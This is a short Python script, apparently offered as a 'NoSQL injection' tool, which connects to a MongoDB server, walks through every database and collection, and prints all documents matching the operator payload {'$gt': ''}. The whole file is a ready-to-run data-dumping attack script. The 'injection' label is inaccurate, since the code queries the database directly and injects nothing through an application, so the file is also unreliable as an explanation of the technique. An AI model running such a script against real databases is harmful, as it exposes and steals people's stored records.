import pymongo

target_mongo_uri = 'mongodb://localhost:27017/test' 


injection_pattern = {"$gt": ""}  

try:
  
    mongo_client = pymongo.MongoClient(target_mongo_uri)
    
    for db_name in mongo_client.list_database_names():
        db = mongo_client[db_name]

        for collection_name in db.list_collection_names():
            collection = db[collection_name]

            query = {
                'name': injection_pattern,  

            }

            cursor = collection.find(query)
   
            for document in cursor:
                print(f'Found document in {db_name}.{collection_name}:')
                print(document)
                print('-' * 30)

except pymongo.errors.ConnectionFailure as e:
    print(f'Connection error: {e}')
except pymongo.errors.ServerSelectionTimeoutError as e:
    print(f'Server selection timeout error: {e}')
except Exception as e:
    print(f'An unexpected error occurred: {e}')
finally:

    if 'mongo_client' in locals():
        mongo_client.close()



#to run use the command python -m NOSQL_Injection
